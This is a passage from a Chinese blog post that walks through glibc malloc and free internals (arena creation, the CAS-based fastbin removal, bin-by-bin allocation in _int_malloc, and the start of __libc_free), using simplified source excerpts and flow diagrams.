(0)</span></span><br></pre></td></tr></table></figure><p>arena_get可以精简成如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> arena_get(ptr, size) do &#123;                \</span></span><br><span class="line"><span class="meta">  ptr = thread_arena;                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (ptr) &#123; __libc_lock_lock (ptr-&gt;mutex); &#125;  \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123; ptr = arena_get2 ((size), NULL); &#125;    \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p>可见主要的实现在arena_get2这个函数里，它的主要作用是为当前线程获取一个可用的arena，这个函数的实现很复杂，考虑了各种情况，函数里又嵌套调用了多个函数，我把关键的流程总结在下图里：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-18_171208.png" alt=""></p><p>上图可以看到，arena_get2的flow里主要调用了get_free_list、reused_arena、_int_new_arena这三个函数，这里不详细讲解每一个函数了，它们的作用从函数名就可以看出来，这三个函数里面_int_new_arena更重要一些，后面着重讲一下这一个函数。</p><h3 id="int-new-arena"><a href="#int-new-arena" class="headerlink" title="_int_new_arena"></a>_int_new_arena</h3><p>这个函数如前图所示，它是用来在arena的个数超出限制之前创建新的arena的，关键代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> mstate _int_new_arena(<span class="type">size_t</span> size) &#123;</span><br><span class="line">  <span class="comment">// 用指定size创建一个新的heap_info对象</span></span><br><span class="line">  heap_info *h = new_heap(size + (<span class="keyword">sizeof</span>(heap_info) </span><br><span class="line">      + <span class="keyword">sizeof</span>(malloc_state) + MALLOC_ALIGNMENT), mp_.top_pad);</span><br><span class="line">  <span class="keyword">if</span> (!h) &#123;</span><br><span class="line">    <span class="comment">// 如果size过大导致new_heap失败，则创建一个只包含</span></span><br><span class="line">    <span class="comment">// 基础数据结构heap_info和malloc_state的对象</span></span><br><span class="line">    h = new_heap (<span class="keyword">sizeof</span> (heap_info) + <span class="keyword">sizeof</span> (malloc_state) </span><br><span class="line">        + MALLOC_ALIGNMENT, mp_.top_pad);</span><br><span class="line">    <span class="keyword">if</span> (!h) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 初始化malloc_state</span></span><br><span class="line">  malloc_state *a = h-&gt;ar_ptr = (malloc_state *) (h + <span class="number">1</span>);</span><br><span class="line">  malloc_init_state (a);</span><br><span class="line">  a-&gt;attached_threads = <span class="number">1</span>;</span><br><span class="line">  a-&gt;system_mem = a-&gt;max_system_mem = h-&gt;size;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 设置malloc_state中的top chunk指针</span></span><br><span class="line">  <span class="comment">// 设置top chunk的header</span></span><br><span class="line">  <span class="type">char</span> *ptr = (<span class="type">char</span> *)(a + <span class="number">1</span>);</span><br><span class="line">  top(a) = (mchunkptr)ptr;</span><br><span class="line">  set_head(top(a), (((<span class="type">char</span> *)h + h-&gt;size) - ptr) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 更新malloc_state中的next链表，把新建的arena加到链表中</span></span><br><span class="line">  thread_arena = a;</span><br><span class="line">  a-&gt;next = main_arena.next;</span><br><span class="line">  main_arena.next = a;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面再用一张memory layout的图示来展示刚创建过的arena长什么样子：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-18_192109.png" alt=""></p><p>前面的_int_new_arena函数中调用了new_heap这个函数，这个函数主要是通过mmap对应的系统调用来通过操作系统分配空间，精简过的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> heap_info *<span class="title function_">new_heap</span><span class="params">(<span class="type">size_t</span> size, <span class="type">size_t</span> top_pad)</span> &#123;</span><br><span class="line">  <span class="comment">// 通过系统调用分配内存</span></span><br><span class="line">  <span class="type">char</span> *p2 = (<span class="type">char</span> *)MMAP(aligned_heap_area, </span><br><span class="line">      HEAP_MAX_SIZE, PROT_NONE, MAP_NORESERVE);</span><br><span class="line">  <span class="keyword">if</span> (__mprotect(p2, size, </span><br><span class="line">      mtag_mmap_flags | PROT_READ | PROT_WRITE) != <span class="number">0</span>) &#123;</span><br><span class="line">    __munmap (p2, HEAP_MAX_SIZE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 初始化heap_info结构体</span></span><br><span class="line">  heap_info *h = (heap_info *)p2;</span><br><span class="line">  h-&gt;size = size;</span><br><span class="line">  h-&gt;mprotect_size = size;</span><br><span class="line">  <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><p>还是先贴一个总流程图:</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/1638952496892-1639312615182.png" alt=""></p><h3 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h3><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/brk&amp;mmap.png" alt=""></p><p><code>brk(*pointer)</code></p><p><code>sbrk(size)</code></p><p>二者都返回拓展后的当前堆的末尾地址</p><h3 id="CAS操作"><a href="#CAS操作" class="headerlink" title="CAS操作"></a>CAS操作</h3><p>在malloc的实现中，需要频繁的插入和删除各个bin中的chunk，很多地方用到了CAS操作，因为用的比较多，这里先简单介绍一下</p><p>CAS是compare and swap的缩写，它是原子操作的一种，可用于在多线程编程中实现不被打断的数据交换操作，从而避免多线程同时改写某一数据时由于执行顺序不确定性以及中断的不可预知性产生的数据不一致问题，该操作通过将内存中的值与指定数据进行比较，当数值一样时将内存中的数据替换为新的值。</p><p>CAS需要有3个操作数：内存地址V，旧的预期值A，即将要更新的目标值B，CAS指令执行时，当且仅当内存地址V的值与预期值A相等时，将内存地址V的值修改为B，否则就什么都不做，整个比较并替换的操作是一个原子操作，下面举一个例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REMOVE_FB(fb, victim, pp)                     \</span></span><br><span class="line"><span class="meta">  do &#123;                                                \</span></span><br><span class="line"><span class="meta">    victim = pp;                                      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (victim == NULL)                               \</span></span><br><span class="line"><span class="meta">      break;                                          \</span></span><br><span class="line"><span class="meta">    pp = REVEAL_PTR(victim-&gt;fd);                      \</span></span><br><span class="line"><span class="meta">  &#125; while ((pp = catomic_compare_and_exchange_val_acq \</span></span><br><span class="line"><span class="meta">      (fb, pp, victim)) != victim);</span></span><br></pre></td></tr></table></figure><p>上面这段代码是用来从fast bin中删除一个chunk，我们这里只关注<em>catomic_compare_and_exchange_val_acq(fb, pp, victim)</em>这个函数调用，其中fb是表头，pp新的节点，victim是老的节点，需要把老节点删掉，把新节点接上，这个调用就是通过CAS操作保证thread-safe的，以x86平台为例，一直往下追，最底层的实现如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __arch_c_compare_and_exchange_val_32_acq(mem, newval, oldval) \</span></span><br><span class="line"><span class="meta">  (&#123;                                                                  \</span></span><br><span class="line"><span class="meta">    __typeof(*mem) ret;                                               \</span></span><br><span class="line"><span class="meta">    __asm __volatile(<span class="string">&quot;cmpl $0, %%&quot;</span> SEG_REG <span class="string">&quot;:%P5\n\t&quot;</span>                 \</span></span><br><span class="line"><span class="meta">                     <span class="string">&quot;je 0f\n\t&quot;</span>                                      \</span></span><br><span class="line"><span class="meta">                     <span class="string">&quot;lock\n&quot;</span>                                         \</span></span><br><span class="line"><span class="meta">                     <span class="string">&quot;0:\tcmpxchgl %2, %1&quot;</span>                            \</span></span><br><span class="line"><span class="meta">                     : <span class="string">&quot;=a&quot;</span>(ret), <span class="string">&quot;=m&quot;</span>(*mem)                          \</span></span><br><span class="line"><span class="meta">                     : BR_CONSTRAINT(newval), <span class="string">&quot;m&quot;</span>(*mem), <span class="string">&quot;0&quot;</span>(oldval), \</span></span><br><span class="line"><span class="meta">                       <span class="string">&quot;i&quot;</span>(offsetof(tcbhead_t, multiple_threads)));   \</span></span><br><span class="line"><span class="meta">    ret;                                                              \</span></span><br><span class="line"><span class="meta">  &#125;)</span></span><br></pre></td></tr></table></figure><p>这是一段x86的内联汇编，GCC的内联汇编语法大家可以自行查阅相关资料，这里只关注lock和cmpxchgl这两个指令，lock确保对内存的read/write操作原子执行，cmpxchgl用来比较并交换操作数，所以归根结底，CAS操作还是通过硬件指令的支持才能实现原子操作。</p><h3 id="从fastbin分配"><a href="#从fastbin分配" class="headerlink" title="从fastbin分配"></a>从fastbin分配</h3><p>在_int_malloc的开始，先看申请的内存大小nb是否符合fast bin的限制，符合的话，首先进入fast bin的分配代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nb &lt;= get_max_fast()) &#123;</span><br><span class="line">  idx = fastbin_index(nb);</span><br><span class="line">  mfastbinptr *fb = &amp;fastbin(av, idx);</span><br><span class="line">  mchunkptr pp;</span><br><span class="line">  <span class="keyword">if</span> ((victim = *fb) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    REMOVE_FB(fb, pp, victim);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会根据nb得到fast bin的index，再根据index，得到指向所在bin的head指针fb，如果这个bin非空，则取第一个chunk，使用前面介绍的REMOVE_FB将其从所在bin删除，并将取到的chunk返回。</p><h3 id="从smallbin分配"><a href="#从smallbin分配" class="headerlink" title="从smallbin分配"></a>从smallbin分配</h3><p>不符合fast bin分配条件的话，会继续看是否符合small bin的分配条件，这部分的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb)) &#123;</span><br><span class="line">  idx = smallbin_index(nb);</span><br><span class="line">  bin = bin_at(av, idx);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((victim = last(bin)) != bin) &#123;</span><br><span class="line">    bck = victim-&gt;bk;</span><br><span class="line">    set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">    bin-&gt;bk = bck;</span><br><span class="line">    bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">      set_non_main_arena(victim);</span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的处理过程和fast bin类似，也是根据nb定位到所在的bin，所在bin非空的话，就分配成功，返回得到的chunk，并且从所在bin中删除，和fast bin的最大不同之处在于这里操作的是双向链表。</p><h3 id="merge-fast-bin-into-unsorted-bin"><a href="#merge-fast-bin-into-unsorted-bin" class="headerlink" title="merge fast bin into unsorted bin"></a><strong>merge fast bin into unsorted bin</strong></h3><p>在fast bin和small bin都分配失败之后，会把fast bin中的chunk进行一次整理合并，然后将合并后的chunk放入unsorted bin中，这是通过malloc_consolidate这个函数完成的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_consolidate</span><span class="params">(mstate av)</span> &#123;</span><br><span class="line">  <span class="comment">// 因为这里会release所有的fast bin，所以先把相应flag disable</span></span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line">  unsorted_bin = unsorted_chunks(av);</span><br><span class="line">  maxfb = &amp;fastbin(av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">  fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">// 两层循环</span></span><br><span class="line">  <span class="comment">// 1. 外层循环遍历所有fast bin</span></span><br><span class="line">  <span class="comment">// 2. 内层循环遍历bin中所有chunk</span></span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    p = atomic_exchange_acq (fb, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// 内层循环主要做了下面几件事，代码太长，略了</span></span><br><span class="line">        <span class="comment">// 1. 如果当前chunk的前一个chunk是free状态，进行合并</span></span><br><span class="line">        <span class="comment">// 2. 如果当前chunk的后一个chunk是free状态，进行合并</span></span><br><span class="line">        <span class="comment">// 3. 如果合并后的chunk不和top chunk挨着，</span></span><br><span class="line">        <span class="comment">//    将合并后的chunk插入到unsorted bin中</span></span><br><span class="line">        <span class="comment">// 4. 如果合并后的chunk和top chunk挨着，</span></span><br><span class="line">        <span class="comment">//    重新设置top chunk的起始位置</span></span><br><span class="line">      &#125; <span class="keyword">while</span> ((p = nextp) != <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="尝试从unsorted-bin中分配"><a href="#尝试从unsorted-bin中分配" class="headerlink" title="尝试从unsorted bin中分配"></a><strong>尝试从unsorted bin中分配</strong></h3><p>这部分代码已经进入_int_malloc中最后那个最大的for循环了，这部分的工作在for循环的刚开始，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  <span class="comment">// for循环的第一部分代码</span></span><br><span class="line">  <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) &#123;</span><br><span class="line">    bck = victim-&gt;bk;</span><br><span class="line">    size = chunksize(victim);</span><br><span class="line">    mchunkptr next = chunk_at_offset(victim, size);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 符合这四个条件的话，从last remainder chunk分配</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(nb) </span><br><span class="line">        &amp;&amp; bck == unsorted_chunks(av) </span><br><span class="line">        &amp;&amp; victim == av-&gt;last_remainder </span><br><span class="line">        &amp;&amp; size &gt; (nb + MINSIZE)) &#123;</span><br><span class="line">      <span class="comment">// 。。。</span></span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 。。。</span></span><br><span class="line">    <span class="comment">// 正好遇到请求大小的chunk，分配成功</span></span><br><span class="line">    <span class="keyword">if</span> (size == nb) &#123;</span><br><span class="line">      <span class="comment">// 。。。</span></span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 当前chunk属于small bin的范围，将其放回small bin</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(size)) &#123;</span><br><span class="line">      <span class="comment">// 。。。</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// 当前chunk属于large bin的范围，将其放回large bin</span></span><br><span class="line">      <span class="comment">// 。。。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从unsorted bin中删除当前chunk</span></span><br><span class="line">    <span class="comment">// 。。。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断最大循环次数</span></span><br><span class="line">    <span class="keyword">if</span> (++iters &gt;= <span class="number">10000</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="尝试从large-bin中分配"><a href="#尝试从large-bin中分配" class="headerlink" title="尝试从large bin中分配"></a>尝试从large bin中分配</h3><p>这是_int_malloc中最后那个大for循环的第二部分代码，在从unsorted bin分配失败之后，准备从large bin分配：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  <span class="comment">// for循环的第二部分代码</span></span><br><span class="line">  <span class="comment">// 判断nb的大小，符合条件的话从large bin分配</span></span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range(nb)) &#123;</span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断前面得到的bin是否为空</span></span><br><span class="line">    <span class="comment">// 不为空的话最大的chunk size是否大于等于请求大小nb</span></span><br><span class="line">    victim = first(bin);</span><br><span class="line">    <span class="keyword">if</span> (victim != bin &amp;&amp; chunksize_nomask(victim) &gt;= nb) &#123;</span><br><span class="line">      <span class="comment">// 1. 用best fit算法找到最合适大小的chunk</span></span><br><span class="line">      <span class="comment">// 2. 对这个chunk进行split，一部分返回给用户，</span></span><br><span class="line">      <span class="comment">// 剩余部分赋值给malloc_state中的remainder，</span></span><br><span class="line">      <span class="comment">// 同时插入到unsorted bin当中</span></span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 在请求大小nb所在的bin分配失败，继续从后面的bin来分配，</span></span><br><span class="line">  <span class="comment">// 在查找后面bin的过程中，会用到binmap来加快查找速度</span></span><br><span class="line">  ++idx;</span><br><span class="line">  bin = bin_at(av, idx);</span><br><span class="line">  block = idx2block(idx);</span><br><span class="line">  <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">  bit = idx2bit(idx);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="comment">// 如果后面没有找到合适的bin，就跳到use_top使用top chunk来分配</span></span><br><span class="line">    <span class="comment">// 如果后面找到了合适的bin，那么：</span></span><br><span class="line">    <span class="comment">// 1. 用best fit算法找到最合适大小的chunk</span></span><br><span class="line">    <span class="comment">// 2. 对这个chunk进行split，一部分返回给用户，</span></span><br><span class="line">    <span class="comment">// 剩余部分赋值给malloc_state中的remainder，</span></span><br><span class="line">    <span class="comment">// 同时插入到unsorted bin当中</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="尝试从top-chunk中分配"><a href="#尝试从top-chunk中分配" class="headerlink" title="尝试从top chunk中分配"></a>尝试从top chunk中分配</h3><p>这是_int_malloc中最后那个大for循环的第三部分代码，在从large bin分配失败之后，准备从top chunk分配：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  <span class="comment">// for循环的第三部分代码</span></span><br><span class="line">  <span class="comment">// 前面都分配失败，从top chunk分配</span></span><br><span class="line">use_top:</span><br><span class="line">  victim = av-&gt;top;</span><br><span class="line">  size = chunksize(victim);</span><br><span class="line">  <span class="keyword">if</span> (size &gt;= (nb + MINSIZE)) &#123;</span><br><span class="line">    <span class="comment">// top chunk的大小如果满足要求，分配成功</span></span><br><span class="line">    <span class="comment">// 剩余的部分成为新的top chunk，同时也会成为remainder</span></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset(victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head(victim, ...);</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (av-&gt;have_fastchunks) &#123;</span><br><span class="line">    <span class="comment">// 如果fast bin flag被设置，</span></span><br><span class="line">    <span class="comment">// 再重新release fast bin的内容到unsorted bin中，</span></span><br><span class="line">    <span class="comment">// 并且重新得到请求大小所在bin的index</span></span><br><span class="line">    malloc_consolidate(av);</span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">      idx = smallbin_index(nb);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      idx = largebin_index(nb);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果top chunk也不满足请求大小，</span></span><br><span class="line">    <span class="comment">// 就使用系统调用增加top chunk，或者再开辟出一块heap</span></span><br><span class="line">    <span class="type">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="free入口"><a href="#free入口" class="headerlink" title="free入口"></a>free入口</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __libc_free(<span class="type">void</span> *mem) &#123;</span><br><span class="line">  <span class="comment">// part1</span></span><br><span class="line">  <span class="type">void</span> (*hook)(<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *) = </span><br><span class="line">        atomic_forced_read(__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">    (*hook)(mem, RETURN_ADDRESS(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// part2</span></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="comment">// part3</span></span><br><span class="line">  mchunkptr p = mem2chunk(mem);</span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped(p)) &#123;</span><br><span class="line">    munmap_chunk(p);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    mstate ar_ptr = arena_for_chunk(p);</span><br><span class="line">    _int_free(ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码分成了part1/2/3三部分：</p><ul><li>part1：调用回调函数，追代码可以发现，这个回调函数为NULL</li><li>part2：允许free(0)这样的调用，即什么都不做，直接返回</li><li>part3：判断所释放的空间是不是使用mmap分配得到的，如果是mmap分配得到的，就使用munmap来释放，如果不是的话，就调用_int_free这个主释放函数来释放，后面就来重点分析这个函数</li></ul><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><p>先贴流程</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-18_161840.png" alt=""></p><p>根据上图，free时先是判断chunk size是不是处在fast bin的范围，是的话就把该chunk放入fast bin中，把chunk放入fast bin的操作是一个CAS操作.</p><p>通过代码实现:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (size &lt;= get_max_fast()) &#123;</span><br><span class="line">  free_perturb(chunk2mem(p), size - CHUNK_HDR_SZ);</span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">true</span>);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx = 